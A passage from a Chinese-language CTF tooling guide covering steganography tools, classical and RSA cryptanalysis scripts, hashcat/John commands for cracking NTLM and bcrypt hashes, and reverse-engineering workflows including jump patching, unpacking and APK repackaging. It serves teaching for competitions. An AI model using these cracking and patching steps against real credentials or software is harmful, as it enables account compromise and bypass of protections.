# 命令行替代（无 010 Editor 时）
xxd file.png | head -20                  # 查看十六进制
printf '\x89\x50\x4e\x47' | dd of=file.png bs=1 count=4 conv=notrunc  # 改文件头
hexdump -C file.png | head               # 带 ASCII 的十六进制
```

### 2.9 GIMP / Audacity 多媒体隐写

```bash
# === GIMP（图片隐写）===
# 1. 改高度/宽度露出隐藏内容
#    用 010 Editor 改 IHDR（见 2.8），或 GIMP 直接调整画布大小
#    图像 → 画布大小 → 改大 → 看露出什么

# 2. 通道分离看 LSB
#    图像 → 分解 → 分解为图层（选 RGB）
#    单独看 R/G/B 通道，某通道可能有隐藏图案

# 3. 图层模式
#    两张相似图片叠加 → 改上层图层模式为"差值"
#    差异处显出隐藏内容

# 4. 调整色阶/曲线
#    颜色 → 色阶 → 拉伸暗部，接近黑的隐藏像素变可见

# === Audacity（音频隐写）===
# 打开音频文件，关注以下几处：

# 1. 频谱图藏字（最常见）
#    左侧波形下拉 → 切换为"频谱图"
#    高频区域可能写着 flag 或摩尔斯电码
#    拖动选区放大看细节

# 2. 摩尔斯电码
#    波形图里长短脉冲 = 滴/嗒
#    长按 = 嗒(-)，短按 = 滴(.)，间隔分字

# 3. LSB 隐写（音频版）
#    用工具：audiostego / silenteye
#    或写脚本提取采样点最低位

# 4. 双声道差异
#    拆分立体声 → 两声道做差 → 听出隐藏语音
#    或两声道 XOR

# 5. SSTV（慢扫描电视，图片转音频）
#    工具：rx-sstv / qsstv
#    把音频当 SSTV 信号解码出图片

# 命令行辅助
sox audio.wav -n spectrogram            # 生成频谱图
sox audio.wav -n stat                   # 看音频统计信息
ffmpeg -i audio.wav -f s16le raw.pcm    # 导出原始 PCM 数据分析
```

### 2.10 binwalk 文件分析与提取

```bash
# binwalk：文件结构与隐藏内容分析，CTF Misc 必备
# 安装：sudo apt install binwalk（Kali 自带）
#       或 git clone https://github.com/ReFirmLabs/binwalk

# 1. 基础分析：扫描文件结构，看里面藏了什么
binwalk file.png              # 分析文件，列出识别到的签名/结构
binwalk -v file.png           # 详细模式
binwalk file.bin              # 对未知文件先 binwalk 看结构

# 2. 自动提取：按识别结果自动 carving 出嵌入文件
binwalk -e file.png           # 自动提取，输出到 _file.png.extracted/
binwalk -eM file.png          # 递归提取（提取结果再提取，处理嵌套压缩包）
binwalk -e --directory=out/ file.png  # 指定输出目录

# 3. 手动提取：自动提取失败时用
binwalk -D='.*' file.png      # 提取所有识别到的文件
binwalk -dd 'png:image/png' file.png  # 只提取 PNG（按 "名称:签名" 过滤）

# 4. 常见 CTF 场景
# 图片藏压缩包 → binwalk image.png 看到 ZIP 签名 → binwalk -e image.png
# 嵌套压缩包   → binwalk -eM file.bin 递归提取到最内层
# 固件分析     → binwalk firmware.bin 看 SquashFS/Linux 内核 → binwalk -e 提取文件系统
# 提取失败     → 转 foremost -i file -o out/（按文件头盲 carving）

# 5. 提取后 zlib 解压（提取出的文件常被 zlib 压缩）
# python3 -c "import zlib; print(zlib.decompress(open('xxx','rb').read()))"

# 选用建议
# 先 binwalk 分析结构 → 有嵌入文件就 binwalk -e 自动提取
# 自动提取失败 → binwalk -D 手动按签名提取，或转 foremost
# 嵌套层级深 → binwalk -eM 递归提取
# binwalk 与 foremost 互补：binwalk 靠签名识别结构，foremost 靠文件头盲 carving
```

***

## 三、Crypto 方向

> 本方向重点推荐：★factordb（大数分解第一步必查，已入库的 n 秒出 p/q）｜★RsaCtfTool（RSA 弱点攻击一键集成，默认 all 跑一遍）｜★hashcat（哈希暴力破解，GPU 加速比 John 快几十倍）
> 使用方法：factordb → 3.7 ｜ RsaCtfTool → 3.5 ｜ hashcat → 3.4
> 各相似工具组的选用逻辑见下方"工具选用建议"段落

### 3.1 工具清单

| 工具           | 用途            | 关键用法                                                                       | GitHub 地址                                      |
| ------------ | ------------- | -------------------------------------------------------------------------- | ---------------------------------------------- |
| ★CyberChef   | 编解码/哈希/加密     | 在线拖拽操作链Hash 模块算 MD5/SHA、Magic 自动识别 → 详见 [CyberChef 指南](CyberChef实战使用指南.md) | <https://github.com/gchq/CyberChef>            |
| ★RsaCtfTool  | RSA 攻击集成      | `python3 RsaCtfTool.py -n N -e E --attack all`集成 Fermat/Wiener/小指数等数十种攻击   | <https://github.com/RsaCtfTool/RsaCtfTool>     |
| yafu         | 大数分解          | `yafu "factor(N)"`本地分解，适合 N 较大时                                            | <https://github.com/bbuhrow/yafu>              |
| SageMath     | 数论/代数计算       | `sage` 交互式`factor(n)` / `discrete_log` / `GF(p)`                           | <https://github.com/sagemath/sage>             |
| hashid       | 哈希类型识别        | `hashid HASH`识别 MD5/SHA/NTLM 等哈希类型                                         | pip install hashid                             |
| ★hashcat     | 哈希暴力破解        | `hashcat -m 0 hash.txt rockyou.txt-m 1000` NTLM、`-a 3` 暴力、GPU 加速           | <https://github.com/hashcat/hashcat>           |
| John         | 密码破解（CPU）     | `john --wordlist=dict.txt hash.txt--format=raw-md5` 指定格式                   | <https://github.com/openwall/john>             |
| ★factordb    | 在线因数分解        | factordb.com 查询 N 是否已分解大数分解第一步必查                                           | 在线服务                                           |
| CaptfEncoder | 编解码工具（本地 GUI） | 本地多格式编解码CyberChef 的离线替代                                                    | <https://github.com/CaptfEncoder/CaptfEncoder> |

**工具选用建议**：

- 大数分解（RSA 拿 p、q）：factordb ★ 第一步必查，别人分解过的 N 直接出结果；查不到再用 yafu 本地分解（适合 N 在 200 位以下）；RsaCtfTool 集成多种攻击，N 分不动时跑 `--attack all` 让它自动尝试
- 哈希破解：hashcat ★ 首选，GPU 加速比 John 快几十倍，模式多（`-m 0` MD5/`-m 1000` NTLM/`-m 3200` bcrypt）；无 GPU 或哈希量小用 John，CPU 通用、格式支持广；先 hashid 识别类型再选 `-m` 模式
- RSA 攻击：RsaCtfTool ★ 集成度高，一键尝试所有攻击；具体某种攻击（如 Wiener、共模）用下方 3.3 脚本手工跑更可控
- 数论计算：SageMath 是数论神器，`factor` / `discrete_log` / 椭圆曲线运算，但安装大、启动慢，简单运算用 Python + gmpy2 即可
- 编解码：CyberChef ★ 在线全能；离线环境用 CaptfEncoder 本地 GUI；批量解码用下方 2.2 脚本

### 3.2 古典密码解密脚本

```python
#!/usr/bin/env python3
"""
古典密码批量解密
凯撒 / 维吉尼亚 / 栅栏 / 培根 / ROT13
"""

import string


def caesar_bruteforce(ciphertext):
    """凯撒密码暴力破解（26 种偏移）"""
    print("[凯撒密码]")
    for shift in range(26):
        plain = ""
        for ch in ciphertext:
            if ch.isalpha():
                base = ord('A') if ch.isupper() else ord('a')
                plain += chr((ord(ch) - base - shift) % 26 + base)
            else:
                plain += ch
        print(f"  偏移 {shift:2d}: {plain}")


def vigenere_decrypt(ciphertext, key):
    """维吉尼亚密码解密"""
    plain = ""
    key = key.upper()
    ki = 0
    for ch in ciphertext:
        if ch.isalpha():
            base = ord('A') if ch.isupper() else ord('a')
            shift = ord(key[ki % len(key)]) - ord('A')
            plain += chr((ord(ch.upper()) - ord('A') - shift) % 26 + base)
            ki += 1
        else:
            plain += ch
    return plain


def fence_decrypt(ciphertext, rails):
    """栅栏密码解密"""
    n = len(ciphertext)
    cycle = 2 * rails - 2
    if cycle == 0:
        return ciphertext
    groups = [''] * rails
    idx = 0
    for r in range(rails):
        chunk_size = n // cycle + (1 if r < n % cycle else 0) if cycle > 0 else n
        # 简化：按周期分组
        pass

    # 简洁实现
    pattern = list(range(rails)) + list(range(rails - 2, 0, -1))
    indices = sorted(range(n), key=lambda i: (pattern[i % len(pattern)], i))
    result = [''] * n
    for i, idx in enumerate(indices):
        if i < len(ciphertext):
            result[idx] = ciphertext[i]
    return ''.join(result)


def bacon_decode(ciphertext):
    """培根密码解码"""
    bacon_table = {}
    for i, ch in enumerate(string.ascii_uppercase):
        code = format(i, '05b').replace('0', 'A').replace('1', 'B')
        bacon_table[code] = ch
    # I=J, U=V 在部分版本中合并，这里用 26 字母版
    bacon_table["01001"] = 'I'  # I/J
    bacon_table["10101"] = 'U'  # U/V

    # 提取 AB 序列
    ab_seq = ''.join(ch.upper() for ch in ciphertext if ch.upper() in 'AB')
    result = ""
    for i in range(0, len(ab_seq) - 4, 5):
        code = ab_seq[i:i+5]
        if code in bacon_table:
            result += bacon_table[code]
    return result


def rot13(s):
    """ROT13"""
    import codecs
    return codecs.decode(s, 'rot_13')


if __name__ == "__main__":
    print("=== 凯撒暴力破解示例 ===")
    caesar_bruteforce("gmbh{fdhvdu}")

    print("\n=== 维吉尼亚示例 ===")
    print(vigenere_decrypt("RIJVS", "KEY"))

    print("\n=== ROT13 示例 ===")
    print(rot13("synt{ebgn13}"))

    print("\n=== 培根密码示例 ===")
    print(bacon_decode("AABBBAABAAABABBABABB"))
```

### 3.3 RSA 常见攻击脚本

```python
#!/usr/bin/env python3
"""
RSA 常见攻击集合
- 小公钥指数攻击 (e=3)
- 共模攻击
- Fermat 分解 (p/q 接近)
- Wiener 攻击 (d 很小)
"""

from math import gcd, isqrt


def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    g, x1, y1 = extended_gcd(b % a, a)
    return g, y1 - (b // a) * x1, x1


def modinv(a, m):
    g, x, _ = extended_gcd(a % m, m)
    if g != 1:
        raise Exception('模逆不存在')
    return x % m


# === 1. 小公钥指数攻击 (e=3, 明文m很小) ===
def small_e_attack(c, e, n):
    """当 e 很小且 m^e < n 时，c = m^e，直接开 e 次方"""
    from gmpy2 import iroot  # pip install gmpy2
    m, is_exact = iroot(c, e)
    if is_exact:
        return int(m)
    # m^e 可能在模 n 意义下未溢出
    # 尝试 c + k*n 开方
    for k in range(100):
        m, is_exact = iroot(c + k * n, e)
        if is_exact:
            return int(m)
    return None


# === 2. 共模攻击 ===
def common_module_attack(c1, c2, e1, e2, n):
    """同一明文用相同 n 不同 e 加密，gcd(e1,e2)=1 时可恢复"""
    g, s1, s2 = extended_gcd(e1, e2)
    if g != 1:
        return None
    # m = c1^s1 * c2^s2 mod n
    if s1 < 0:
        c1 = modinv(c1, n)
        s1 = -s1
    if s2 < 0:
        c2 = modinv(c2, n)
        s2 = -s2
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    return m


# === 3. Fermat 分解 (p 和 q 接近) ===
def fermat_factor(n):
    """当 p 和 q 接近时，Fermat 分解高效"""
    a = isqrt(n)
    if a * a == n:
        return a, a
    a += 1
    b2 = a * a - n
    while True:
        b = isqrt(b2)
        if b * b == b2:
            p, q = a + b, a - b
            if p * q == n:
                return p, q
        a += 1
        b2 = a * a - n
        if a - isqrt(n) > 1000000:  # 防止无限循环
            return None, None


# === 4. Wiener 攻击 (d 很小，e 很大) ===
def wiener_attack(e, n):
    """当 d < n^0.25 时，连分数展开可恢复 d"""
    def continued_fraction(e, n):
        cf = []
        while n:
            q, r = divmod(e, n)
            cf.append(q)
            e, n = n, r
        return cf

    def convergents(cf):
        convs = []
        h_prev, h_curr = 0, 1
        k_prev, k_curr = 1, 0
        for a in cf:
            h_prev, h_curr = h_curr, a * h_curr + h_prev
            k_prev, k_curr = k_curr, a * k_curr + k_prev
            convs.append((h_curr, k_curr))
        return convs

    cf = continued_fraction(e, n)
    convs = convergents(cf)

    for k, d in convs:
        if k == 0:
            continue
        # phi = (e*d - 1) / k
        phi_times = e * d - 1
        if phi_times % k != 0:
            continue
        phi = phi_times // k
        # n = p*q, phi = (p-1)(q-1) => p+q = n - phi + 1
        s = n - phi + 1
        # p,q 是 x^2 - s*x + n = 0 的根
        discriminant = s * s - 4 * n
        if discriminant < 0:
            continue
        from math import isqrt
        sqrt_disc = isqrt(discriminant)
        if sqrt_disc * sqrt_disc == discriminant:
            p = (s + sqrt_disc) // 2
            q = (s - sqrt_disc) // 2
            if p * q == n:
                return d, p, q
    return None


# === 5. 已知 p,q 求明文 ===
def rsa_decrypt(c, p, q, e=65537):
    n = p * q
    phi = (p - 1) * (q - 1)
    d = modinv(e, phi)
    m = pow(c, d, n)
    return m


def int_to_bytes(n):
    """大整数转字节串"""
    length = (n.bit_length() + 7) // 8
    return n.to_bytes(length, 'big')


if __name__ == "__main__":
    print("RSA 攻击脚本集合，根据题目情况选择对应函数调用")
    print("函数列表:")
    print("  small_e_attack(c, e, n)          - 小公钥指数攻击")
    print("  common_module_attack(c1,c2,e1,e2,n) - 共模攻击")
    print("  fermat_factor(n)                  - Fermat 分解")
    print("  wiener_attack(e, n)               - Wiener 攻击")
    print("  rsa_decrypt(c, p, q, e)           - 已知 p,q 解密")
```

### 3.4 哈希类型识别与破解

```bash
# 识别哈希类型
hashid HASH_VALUE

# hashcat 常用模式
# -m 0     MD5
# -m 100   SHA1
# -m 1400  SHA256
# -m 1700  SHA512
# -m 900   MD4
# -m 1000  NTLM
# -m 3200  bcrypt
# -m 5600  NetNTLMv2

hashcat -m 0 hash.txt rockyou.txt              # MD5 字典破解
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a        # 暴力破解
hashcat -m 0 -a 0 hash.txt dict.txt --rule=best64  # 规则变换

# John the Ripper
john --format=raw-md5 hash.txt --wordlist=rockyou.txt
john --format=raw-sha256 hash.txt --wordlist=rockyou.txt
```

### 3.5 RsaCtfTool 使用方法

```bash
# RsaCtfTool：RSA 攻击自动化工具，集成几十种 RSA 弱点攻击
# 安装：git clone https://github.com/RsaCtfTool/RsaCtfTool.git
#       cd RsaCtfTool && pip3 install -r requirements.txt

# 1. 基础用法：给 n e c（密文），自动尝试多种攻击解出明文
python3 RsaCtfTool.py -n N_VALUE -e E_VALUE --uncipher C_VALUE

# 2. 已知 n e，攻击私钥（试常见弱点：小公钥指数、Wiener、Fermat 等）
python3 RsaCtfTool.py -n N_VALUE -e E_VALUE --private

# 3. 已知 n e，自动分解 n（试 factordb / Fermat / Pollard 等）
python3 RsaCtfTool.py -n N_VALUE -e E_VALUE --attack factordb,fermat

# 4. 指定单种攻击（调试或已知弱点类型时用）
python3 RsaCtfTool.py -n N -e E --attack wiener --private
# 常见 attack 名称：
#   wiener        Wiener 攻击（私钥 d 很小时）
#   fermat        Fermat 分解（p 与 q 接近时）
#   pollard_rho   Pollard's rho 分解
#   factordb      在线查 factordb 数据库
#   hastads       e 很小且相同明文多次加密（Håstad 广播攻击）
#   all           默认，全部攻击跑一遍

# 5. Håstad 广播攻击（e 个相同明文、不同模数的密文）
python3 RsaCtfTool.py -e E \
    --uncipherfile c1.txt --uncipherfile c2.txt --uncipherfile c3.txt \
    --attack hastads

# 6. 从文件读参数（n.txt / e.txt / c.txt 各放一行）
python3 RsaCtfTool.py -n $(cat n.txt) -e $(cat e.txt) --uncipher $(cat c.txt)

# 选用建议
# RSA 题首选：直接默认 all 攻击跑一遍，跑出就赢；跑不出再针对性单攻
# 与 SageMath 互补：RsaCtfTool 偏"已知弱点自动打"，SageMath 偏"自己写攻击脚本"
```

### 3.6 SageMath 使用方法

```bash
# SageMath：开源数学软件（类 Mathematica），CTF Crypto 必备
# 安装（Ubuntu）：sudo apt install sagemath
# 启动交互：sage
# 跑脚本：sage script.sage

# 1. RSA 解密基本流程
sage: p = 3483342589; q = 5035239467
sage: n = p * q; e = 65537
sage: phi = (p-1)*(q-1)
sage: d = inverse_mod(e, phi)              # 求 d = e^-1 mod phi
sage: m = power_mod(c, d, n)               # m = c^d mod n
sage: bytes.fromhex(hex(m)[2:])            # 转成字符串

# 2. 小公钥指数攻击（e=3，明文小，没填充）
sage: # c = m^3 mod n，若 m^3 < n 则直接开立方
sage: m = Integer(c).nth_root(3, truncate_mode=True)

# 3. Fermat 分解（p q 接近时）
sage: def fermat(n):
....:     a = isqrt(n) + 1
....:     while not is_square(a*a - n): a += 1
....:     b = isqrt(a*a - n)
....:     return a-b, a+b
sage: p, q = fermat(n)

# 4. Pollard's p-1 分解（p-1 平滑时）
sage: def pollard_pm1(n, B=2^20):
....:     a = 2
....:     for j in range(2, B): a = power_mod(a, j, n)
....:     d = gcd(a-1, n)
....:     return d if 1 < d < n else None

# 5. LLL 格规约（解背包密码、Hidden Number Problem 等）
sage: M = Matrix(ZZ, [[...], [...]])
sage: M.LLL()

# 6. 离散对数（ElGamal / ECC）
sage: # 有限域离散对数
sage: F = GF(p); g = F(primitive_root(p))
sage: discrete_log(F(c), g)                # 求 x 使 g^x = c
sage: # 椭圆曲线离散对数
sage: E = EllipticCurve(GF(p), [a, b])
sage: G = E(x1, y1); Q = E(x2, y2)
sage: Q.log(G)                             # 求 k 使 k*G = Q

# 7. Coppersmith 小根攻击（已知明文高位 / stereotyped messages）
sage: P.<x> = PolynomialRing(Zmod(n))
sage: f = (m_high + x)^e - c
sage: f.small_roots(X=2^bits, beta=1)

# 选用建议
# 需要写攻击脚本 / 涉及格 / ECC / Coppersmith → SageMath
# 只想快速试常见 RSA 弱点 → RsaCtfTool
```

### 3.7 factordb 大数分解使用方法

```bash
# factordb：大数在线分解数据库，输入 n 自动查是否已被分解过
# 在线地址：http://factordb.com/

# 1. 网页用法
#    访问 http://factordb.com/ → 输入 n → 查询，看状态：
#      C   (Composite)          未知分解，无法直接用，转其他攻击
#      CF  (Composite, factors) 部分分解
#      FF  (Fully factored)     完全分解，直接复制 p q 用于解密
#      P   (Prime)              本身是素数

# 2. 命令行工具 factordb-pycli（pip install factordb-pycli）
python3 -c "from factordb.factordb import FactorDB; f=FactorDB(N); f.connect(); print(f.get_factor_list())"

# 3. 批量查（n 放文件，每行一个）
while read n; do
  python3 -c "from factordb.factordb import FactorDB; f=FactorDB($n); f.connect(); print($n, f.get_factor_list())"
done < n_list.txt

# 4. 在 RsaCtfTool / SageMath 中结合用
#    RsaCtfTool 默认会先查 factordb：
python3 RsaCtfTool.py -n N -e E --attack factordb --private
#    SageMath 也可先查再算：
sage: from factordb.factordb import FactorDB
sage: f = FactorDB(n); f.connect(); p, q = f.get_factor_list()

# 选用建议
# 看到 n 第一步永远是先查 factordb（最快捷径）
# 状态 FF → 直接拿 p q；状态 C → 转 RsaCtfTool / SageMath 写攻击
# factordb / RsaCtfTool / yafu 三者对比：
#   factordb   在线查库最快，但只对"已被分解过"的 n 有效
#   RsaCtfTool 自动试多种弱点攻击，通用
#   yafu       本地强攻分解（Fermat/ECM/SIQS），适合中等规模未入库的 n
```

***

## 四、Reverse 方向

> 本方向重点推荐：★IDA Pro（静态反编译，F5 伪代码质量最高）｜★GDB + pwndbg（Linux 动态调试标配，逆向/PWN 通用）｜★jadx（Android 一键反编译出 Java 源码，GUI 浏览）
> 使用方法：IDA Pro → 独立指南 ｜ GDB + pwndbg → 独立指南 ｜ jadx → 4.7
> 各相似工具组的选用逻辑见下方"工具选用建议"段落

### 4.1 工具清单

| 工具            | 用途           | 关键用法                                                            | GitHub 地址                                          |
| ------------- | ------------ | --------------------------------------------------------------- | -------------------------------------------------- |
| ★IDA Pro      | 静态反汇编/反编译    | 拖入二进制 → F5 看伪代码X 查交叉引用、N 重命名→ 详见 [IDA Pro 指南](IDA_Pro实战使用指南.md) | 商业软件                                               |
| Ghidra        | 开源逆向框架       | 导入 → 自动分析 → CodeBrowser右侧自动显示反编译伪代码                             | <https://github.com/NationalSecurityAgency/ghidra> |
| x64dbg        | Windows 动态调试 | 下断点（F2）→ 单步（F8/F7）看寄存器/内存/堆栈                                    | <https://github.com/x64dbg/x64dbg>                 |
| ★GDB + pwndbg | Linux 动态调试   | `gdb ./binary` → `b *0x401234` → `r`vmmap/telescope/cyclic_find→ 详见 [GDB+pwndbg 指南](GDB+pwndbg实战使用指南.md) | <https://github.com/pwndbg/pwndbg>                 |
| angr          | 符号执行         | 自动求解路径约束找成功分支地址 → explore(find=, avoid=)                        | <https://github.com/angr/angr>                     |
| z3            | 约束求解器        | 建模逻辑约束 → `solver.check()` 求解逆向还原算法/flag 校验                      | <https://github.com/Z3Prover/z3>                   |
| ltrace        | 库函数追踪        | `ltrace ./binary`看调用了哪些库函数及参数                                   | 系统自带                                               |
| strace        | 系统调用追踪       | `strace ./binary-e trace=open,read` 过滤                          | 系统自带                                               |
| strings       | 提取字符串        | `strings binary \| grep -i flag`快速找线索                           | 系统自带                                               |
| file          | 文件类型         | `file binary`看架构（x86/ARM/MIPS）和位数                               | 系统自带                                               |
| readelf       | ELF 信息       | `readelf -a binary`看段/节/符号/入口                                   | 系统自带                                               |
| objdump       | 反汇编          | `objdump -d binary-M intel` 用 Intel 语法                          | 系统自带                                               |
| patchelf      | 修改 ELF       | `patchelf --set-interpreter ./ld binary`替换 libc 调试              | <https://github.com/NixOS/patchelf>                |
| apktool       | APK 逆向       | `apktool d app.apk`反编译资源 + smali                                | <https://github.com/iBotPeaches/Apktool>           |
| ★jadx         | Android 反编译  | `jadx-gui app.apk`直接出 Java 源码、GUI 浏览                            | <https://github.com/skylot/jadx>                   |
| dex2jar       | dex 转 jar    | `d2j-dex2jar.sh classes.dex`再用 jd-gui 看 Java 源码                 | <https://github.com/pxb1988/dex2jar>               |

**工具选用建议**：

- 静态逆向：IDA Pro ★ 行业标准，F5 反编译质量最高、调试器内置，完整用法见 [IDA Pro 指南](IDA_Pro实战使用指南.md)；无授权或需多人协作用 Ghidra（开源免费），两者反编译器各有盲区，IDA 失败时换 Ghidra 试试
- 动态调试：Windows 程序用 x64dbg（GUI 友好）；Linux 程序用 GDB + pwndbg ★（pwndbg 增强后上下文清晰，PWN/逆向通用），完整用法见 [GDB+pwndbg 指南](GDB+pwndbg实战使用指南.md)；两者按目标平台选，不冲突
- 符号执行 vs 约束求解：angr 适合"找从入口到成功分支的输入"，自动探索路径；z3 适合"已知算法逻辑、求满足约束的输入"（如 flag 校验），更轻量可控；复杂题 angr 慢时拆出来用 z3
- ROP gadget 查找：ROPgadget ★ Python 易用、输出清晰；ropper 功能更全（支持 JS 脚本），ROPgadget 失败时换 ropper
- Android 逆向：jadx ★ 一键反编译出 Java 源码、GUI 浏览最方便，首选；apktool 反编译资源 + smali（改资源/重打包时用）；dex2jar 配合 jd-gui 是老方案，jadx 基本替代了它
- 系统小工具组合：`file` 看类型 → `strings` 找线索 → `readelf`/`objdump` 看结构，逆向第一步必做

### 4.2 z3 约束求解模板

```python
#!/usr/bin/env python3
"""
z3 约束求解模板
常用于逆向中还原算法、求解约束条件
pip install z3-solver
"""

from z3 import *


def z3_example():
    """示例：求解简单约束"""
    x = BitVec('x', 32)
    y = BitVec('y', 32)

    s = Solver()
    s.add(x + y == 0x1234)
    s.add(x * y == 0x5678)
    s.add(x > 0)
    s.add(y > 0)

    if s.check() == sat:
        m = s.model()
        print(f"x = {m[x]}, y = {m[y]}")


def z3_reverse_example():
    """示例：逆向算法还原
    假设逆向出的关键比较逻辑：
    if ((input * 0xDEAD + 0xBEEF) ^ input) == 0x12345678)
    """
    inp = BitVec('inp', 64)

    s = Solver()
    s.add(((inp * 0xDEAD + 0xBEEF) ^ inp) == 0x12345678)

    if s.check() == sat:
        m = s.model()
        print(f"input = {m[inp]}")
        print(f"input (hex) = {hex(m[inp].as_long())}")


def z3_flag_checker():
    """示例：逐字符 flag 检查还原
    常见于 CTF 逆向题：逐字符验证 flag
    """
    flag_len = 20
    flag = [BitVec(f'f{i}', 8) for i in range(flag_len)]

    s = Solver()

    # 每个字符是可打印 ASCII
    for c in flag:
        s.add(c >= 0x20, c <= 0x7e)

    # 假设还原出的约束（示例）
    # flag[0] == 'f', flag[1] == 'l', flag[2] == 'a', flag[3] == 'g'
    s.add(flag[0] == ord('f'))
    s.add(flag[1] == ord('l'))
    s.add(flag[2] == ord('a'))
    s.add(flag[3] == ord('g'))
    # 后续约束根据逆向结果添加
    # s.add(flag[4] + flag[5] == 0xAB)
    # s.add(flag[4] * flag[5] == 0xCD)
    # ...

    if s.check() == sat:
        m = s.model()
        result = ''.join(chr(m[c].as_long()) for c in flag)
        print(f"flag = {result}")


if __name__ == "__main__":
    print("=== z3 简单约束 ===")
    z3_example()

    print("\n=== z3 逆向还原 ===")
    z3_reverse_example()
```

### 4.3 angr 符号执行模板

```python
#!/usr/bin/env python3
"""
angr 符号执行模板
自动寻找从入口到目标地址的路径
pip install angr
"""

import angr


def angr_solve(binary_path, find_addr, avoid_addrs=None):
    """
    binary_path: 二进制文件路径
    find_addr: 目标地址（如打印 flag 的地址）
    avoid_addrs: 要避开的地址列表（如失败分支）
    """
    proj = angr.Project(binary_path, auto_load_libs=False)
    state = proj.factory.entry_state()

    sm = proj.factory.simulation_manager(state)

    avoid = avoid_addrs or []
    sm.explore(find=find_addr, avoid=avoid)

    if sm.found:
        found_state = sm.found[0]
        # 输出标准输出
        print(f"[+] 找到路径!")
        print(f"[+] stdout: {found_state.posix.dumps(1).decode('utf-8', errors='ignore')}")

        # 如果需要从内存/寄存器提取 flag
        # flag = found_state.solver.eval(flag_variable, cast_to=bytes)
        return found_state
    else:
        print("[-] 未找到路径")
        return None


# 用法
if __name__ == "__main__":
    # 修改为实际值
    # angr_solve("./binary", find_addr=0x400850, avoid_addrs=[0x400830])
    print("请根据题目修改 binary_path、find_addr、avoid_addrs")
    print("常用方法：用 IDA 找到成功/失败分支地址，填入参数")
```

### 4.4 GDB + pwndbg 常用命令

> 完整用法（安装配置、断点管理、内存操作、pwntools 配合、题型实战等）见 [GDB+pwndbg 实战使用指南](GDB+pwndbg实战使用指南.md)。

```bash
# 基本调试
gdb ./binary
b main              # 在 main 下断点
r                   # 运行
ni                  # 不进入函数的单步
si                  # 进入函数的单步
c                   # 继续运行
finish              # 运行到当前函数返回

# 查看信息
info registers      # 查看寄存器
info functions      # 查看函数列表
x/20wx $rsp         # 查看栈内存 (20个4字节十六进制)
x/s 0x400000        # 查看字符串
disas main          # 反汇编 main

# pwndbg 增强
vmmap               # 查看内存映射
checksec            # 查看保护机制
telescope $rsp 20   # 递归查看栈内容
context             # 显示上下文(寄存器/代码/栈)

# 修改
set $rax = 0        # 修改寄存器
set {int}0x7fffffffe000 = 0x1234  # 修改内存

# Patch
# 用 IDA 或 radare2 修改二进制，或用 gdb 的 write 命令
```

### 4.5 checksec 与保护机制

```bash
# 查看保护
checksec binary
# 或
readelf -l binary | grep -i stack

# 保护机制含义：
# NX (No Execute)     栈不可执行，无法在栈上运行 shellcode
# PIE (Position Independent)  地址随机化
# Canary              栈保护，函数返回前检查金丝雀值
# RELRO               GOT 表只读 (Full RELRO 更强)
# ASLR (系统级)       地址空间布局随机化
```

### 4.6 x64dbg 使用方法

```bash
# x64dbg：Windows 动态调试器，开源免费，CTF 逆向/脱壳/改逻辑必备
# 下载：https://x64dbg.com/  解压即用（x32dbg 调 32 位，x64dbg 调 64 位）

# 1. 基本调试流程
#    File → Open → 选 exe → 自动停在入口（EP）
#    F9  运行到断点        F8  单步步过（不进函数）
#    F7  单步步入（进函数） F2  下/取消断点
#    Ctrl+F9 运行到返回     Alt+F9 在用户态执行到返回

# 2. 常用窗口
#    CPU      反汇编 + 寄存器 + 栈 + 内存跳转，主战场
#    寄存器    右键改值、跟到内存地址
#    内存映射  看各段基址/大小/权限，找加壳后真实代码段
#    引用      Search for → All modules → String references
#    命令栏    底部输入命令，如 bp 0x401000 / g / e

# 3. 字符串与函数定位（逆向第一步）
#    右键反汇编区 → Search for → All modules → String references
#    找 "flag"/"wrong"/"success" → 双击跳到代码 → F2 下断 → F9 跑
#    对比"正确/错误"分支，改 ZF 标志位或 patch 跳转即可绕过校验

# 4. 内存断点（找读 flag 的位置）
#    内存映射里找到 flag 数据地址 → 右键 → Breakpoint → Access/Hardware
#    程序读 flag 时断下，附近代码就是校验算法

# 5. 修改变量/跳转（绕过校验）
#    寄存器窗口右键某寄存器 → 修改值
#    反汇编里右键某条 jnz → Assemble → 改成 jmp / nop，强行走正确分支

# 6. Scylla 插件脱壳（自带）
#    跑到 OEP 后 → Plugins → Scylla → 选进程 → IAT AutoSearch
#    → Get Imports → Dump → Fix Dump 修复输入表
#    脱壳后的 exe 再丢 IDA 静态分析

# 7. 常用插件
#    ScyllaHide     反反调试（绕过 IsDebuggerPresent 等）
#    xAnalyzer      参数/结构体标注
#    Keylet         脚本自动化

# 选用建议
# Windows 程序（exe/dll）动态调试 → x64dbg
# Linux 程序（elf）动态调试 → GDB + pwndbg
# 静态看伪代码 → IDA/Ghidra；动态跟执行流/脱壳/改逻辑 → x64dbg
# 实战常配合：IDA 找到关键函数地址 → x64dbg 下断动态确认
```

### 4.7 Android 逆向使用方法（jadx / apktool / dex2jar）

```bash
# === jadx（首选，直接出 Java 源码）===
# 安装：https://github.com/skylot/jadx/releases  下载解压
jadx-gui app.apk              # GUI 打开，左侧包结构，右侧 Java 源码
jadx -d out/ app.apk          # 命令行批量反编译到 out 目录
jadx --show-bad-code app.apk  # 反编译失败时强制输出（部分代码可能不准）
# 流程：jadx-gui 打开 → 搜 "flag"/"check"/"encrypt" → 跟到校验函数
#       看 Java 逻辑（比 smali 好读）→ 还原算法 / 直接改逻辑

# === apktool（反编译资源 + smali，改资源/重打包必备）===
# 安装：https://ibotpeaches.github.io/Apktool/install/
apktool d app.apk -o out/     # 反编译：资源(res/) + AndroidManifest + smali
apktool b out/ -o app_new.apk # 改完后重新打包
# 改 smali 逻辑示例：找到关键 if-eqz/if-nez → 改成相反跳转 → 重打包
# 重打包后必须签名才能装：
keytool -genkey -keystore my.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
jarsigner -keystore my.keystore app_new.apk mykey
# 或 apksigner sign --ks my.keystore app_new.apk

# === dex2jar + jd-gui（老方案，jadx 基本替代）===
d2j-dex2jar.sh app.apk        # dex 转 jar
jd-gui app.jar                # jd-gui 看 Java 源码（质量不如 jadx）
# 现在直接用 jadx；仅 jadx 反编译失败时备用

# === 动态分析：frida hook（比改 smali 重打包更省事）===
# 启动：frida -U -l hook.js -f com.x.target
# hook.js：打印校验函数的参数和返回值
# Java.perform(function(){
#   var C = Java.use('com.x.Checker');
#   C.verify.implementation = function(a){
#     var r = this.verify(a);
